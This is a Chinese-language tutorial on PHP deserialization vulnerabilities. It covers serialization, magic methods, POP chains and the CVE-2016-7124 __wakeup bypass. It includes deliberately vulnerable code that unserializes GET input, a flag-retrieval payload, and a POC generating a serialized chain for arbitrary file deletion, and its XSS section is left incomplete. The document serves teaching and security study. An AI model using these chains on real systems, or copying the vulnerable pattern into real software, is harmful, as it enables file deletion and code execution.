反序列化

反序列化漏洞是基于序列化和反序列化的操作，在反序列化unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。

基础知识

序列化和反序列化

序列化是将对象的状态信息（对象的属性值）转换为可以存储或传输的形式的过程，在序列化期间，对象将当前状态写入（字符串）到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象状态，重新创建该对象。

  • 序列化：把对象状态信息转换为字节序列的过程称为对象的序列化（对象状态信息→字节序列）。
  • 反序列化：把字节序列恢复为对象的过程称为对象的反序列化（字节序列→对象(类结构)）。

在PHP中通过使用serialize()函数和unserialize()函数将对象进行序列化和反序列化操作。如下所示代码展示在PHP中对象的序列化和发序列化操作。

<?php
header("Content-Type:text/html;charset=utf-8");
class UserInfo
{
    public $name;
    public $age;
    public $address;
    // 序列化: %00*%00属性名
    protected $gender;
    // 序列化: %00类名%00属性名
    private $isGood = true;

    // 实例化时被调用
    public function __construct($name, $age, $address, $gender)
    {
        $this->name = $name;
        $this->age = $age;
        $this->address = $address;
        $this->gender = $gender;
    }
    // 打印对象时被调用
    public function __toString()
    {
        $str = 'name: ' . $this->name . '<br>';
        $str .= 'age: ' . $this->age . '<br>';
        $str .= 'address: ' . $this->address . '<br>';
        $str .= 'gender: ' . $this->gender . '<br>';
        $str .= 'isGood: ' . $this->isGood . '<br>';
        return $str;
    }
}

echo '---------------对象实例化---------------<br>';
$obj = new UserInfo('Alice', 18, '四川成都', '女');
echo "<br/>";

echo '---------------打印对象---------------<br>';
echo $obj;
echo "<br/>";

echo '------------对象序列化----------------<br>';
// 序列化
$s_serialize = serialize($obj);
echo "serialize_Str -><br>" . $s_serialize . '<br>';
// 更加清楚的展示私有属性和受保护属性序列化的结果
echo 'serialize_str by urlencode -><br>' . urlencode($s_serialize) . '<br>';
echo "<br/>";

echo '-----------对象反序列化---------------<br>';
// 反序列化
$unseri = unserialize($s_serialize);
echo '<pre>';
var_dump($unseri);
echo "<br/>";

魔术方法

魔术方法是语言中保留的方法名，各个方法会在对应操作时自动调用，下面是PHP语言中的魔术方法。

  • __construct(): 当创建对象时触发，一般用于初始化对象，对变量赋初值
  • __destruct(): 当一个对象被销毁时触发
  • __sleep(): 使用serialize()时自动触发
  • __wakeup(): 使用unserialize()时自动触发
  • __toString(): 当一个类被当成字符串使用时触发
  • __invoke(): 当尝试以调用函数的方式调用一个对象时触发
  • __call(): 在对象上下文中调用不可访问的方法时触发
  • __callStatic(): 在静态上下文中调用不可访问的方法时触发
  • __get(): 用于从不可访问的属性读取数据
  • __set(): 用于将数据写入不可访问的属性
  • __isset(): 在不可访问的属性上调用isset()或empty()触发
  • __unset(): 在不可访问的属性上使用unset()时触发
  • __serialize(): 与__sleep()魔术方法一样，若同时定义则忽略__sleep()执行该方法（PHP7.4.0开始启用）
  • __unserialize(): 与__wakeup()魔术方法一样，若同时定义则忽略__wakeup()执行该方法（PHP7.4.0开始启用）

下面的代码示例中展示了重要魔术方法的使用：

<?php
header("Content-Type:text/html;charset=utf-8");
class UserInfo
{

    public $age;
    public $address;
    // 序列化: %00*%00属性名
    protected $gender;
    // 序列化: %00类名%00属性名
    private $isGood = true;

    // 实例化时被调用
    public function __construct($name, $age, $address, $gender)
    {
        echo "__construct<br>";
        $this->name = $name;
        $this->age = $age;
        $this->address = $address;
        $this->gender = $gender;
    }
    // 对象销毁时被调用
    public function __destruct()
    {
        echo "__destruct<br>";
    }
    // 打印对象时被调用
    public function __toString()
    {
        $str = 'name: ' . $this->name . '<br>';
        $str .= 'age: ' . $this->age . '<br>';
        $str .= 'address: ' . $this->address . '<br>';
        $str .= 'gender: ' . $this->gender . '<br>';
        $str .= 'isGood: ' . $this->isGood . '<br>';
        echo '__toString<br>';
        return $str;
    }
    // 对象序列化时先被调用
    public function __sleep()
    {
        echo "__sleep<br>";
        // 数组指定可以哪些属性可以被序列化
        // 这里可以更好的控制访问权限（不允许私有属性被序列化）
        return ['name', 'age', 'address', 'gender'];
    }
    // 对象反序列化时被调用
    public function __wakeup()
    {
        echo "__wakeup<br>";
    }
    // 当调用不存在的非静态方法时
    public function __call($name, $arg)
    {
        echo '__call<br>';
        echo "调用的$name($arg)方法不存在<br>";
    }
    // 当调用不存在的静态方法
    public static function __callStatic($name, $arg)
    {
        echo '__callStatic<br>';
        echo "调用的$name($arg)静态方法不存在<br>";
    }
    public function __get($name)
    {
        echo '__get<br>';
    }
    public function __set($name, $value)
    {
        echo '__set<br>';
    }
}

echo '---------------对象实例化---------------<br>';
$obj = new UserInfo('Alice', 18, '四川成都', '女');
echo "<br/>";

echo '---------------调用对象的方法或属性---------------<br>';
$obj->PrintVar(22);
$obj->test;
echo "<br/>";

echo '---------------打印对象---------------<br>';
echo $obj;
echo "<br/>";

echo '------------对象序列化----------------<br>';
// 序列化
$s_serialize = serialize($obj);
echo "serialize_Str -><br>" . $s_serialize . '<br>';
echo 'serialize_str by urlencode -><br>' . urlencode($s_serialize) . '<br>';
echo "<br/>";

echo '-----------对象反序列化---------------<br>';
// 反序列化
$unseri = unserialize($s_serialize);
echo '<pre>';
var_dump($unseri);
echo "<br/>";

反序列化利用

如下所示的代码片段需要通过发序列化操作才能得到flag。

<?php
error_reporting(0);
$KEY = "flag";
$input = $_GET['input'];
if (unserialize($input) === "$KEY") {
    echo "flag{xxxxxx}";
}

payload:
http://10.10.10.138/test.php?input=s:4:"flag";
// 输出
flag{xxxxxx}
  • 将serialize(flag)序列化后的结果作为参数传递即可得到flag。

这是一个极其简化代码原型，在真实的环境中通过序列化的是类对象，反序列化的将触发魔术方法进而引起其他危险操作，如代码执行、命令执行等。

漏洞检测

反序列化漏洞的发现一般需要审计源码，寻找可利用的POP链。

直接在魔术方法中就有可以利用的漏洞，自动调用魔术方法从而触发漏洞，这种方式是反序列化漏洞利用的简化版，而实际中基本不会有这种这么简单的，更多的则是需要通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。

POP链（Property Oriented Programming Chain）：通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递、关联等可以调用的其他执行敏感操作的函数，绕过传递参数执行敏感操作，即

用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作

序列化漏洞

XSS

当目标被public修饰时反序列化漏洞的利用

产生条件

  • 反序列化对象的公共属性值可控；
  • 触发魔术方法时将公共属性值直接打印。

代码示例

<?php
class A
{
    public $test = "demo";
    function __destruct()
    {
        echo $this->test;
    }
}
$a = $_GET['value'];
$a_unser = unserialize($a);

    {

    }

CVE-2016-7124 __wakeup绕过

__wakeup()魔法函数简介

调用unserialize()方法时会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源。
反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。

漏洞影响版本

  • php5 < 5.6.25
  • php7 < 7.0.10

漏洞复现

实验环境

  • PHP5.6.9

  • 反序列化对象的属性值可控；
  • 触发魔术方法时将属性值带入并执行文件删除操作。

代码示例

<?php

class A
{
    protected $obj;

    function __construct()
    {

        $this->obj = new C;
    }

    function __toString()
    {

        if (isset($this->obj)) return $this->obj->Delete();
    }
}

class B
{
    public $cache_file;

    function Delete()
    {
        $file = "C:/test/{$this->cache_file}";

        if (file_exists($file)) {

            @unlink($file);
        }

        return 'I am a evil Delete function';
    }
}

class C
{

    function Delete()
    {

        return 'I am a safe Delete function';
    }
}

$user_data = unserialize($_GET['data']);

echo $user_data;

利用方式

通过分析上述源码，构造POP链为：

A类→__construct()→$this->obj=new B→__tostring()→B.Delete方法

此POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用B中的Delete()方法，造成任意文件删除的危害。

使用如下POC生成序列化串，操作如下所示。

<?php

class A
{
    protected $obj;

    function __construct()
    {

        $this->obj = new B;
    }

    function __toString()
    {

        if (isset($this->obj)) return $this->obj->Delete();
    }
}

class B
{
    public $cache_file = '1.txt';

    function Delete()
    {
        $file = "C:/test/{$this->cache_file}";

        if (file_exists($file)) {

            // @unlink($file);
        }

        return 'I am a evil Delete function';
    }
}

class C
{

    function Delete()
    {

        return 'I am a safe Delete function';
    }
}

echo serialize(new A());

// 输出
O:1:"A":1:{s:6:"%00*%00obj";O:1:"B":1:{s:10:"cache_file";s:5:"1.txt";}}
// 1.txt可任意修改使用相对路径达到任意文件删除
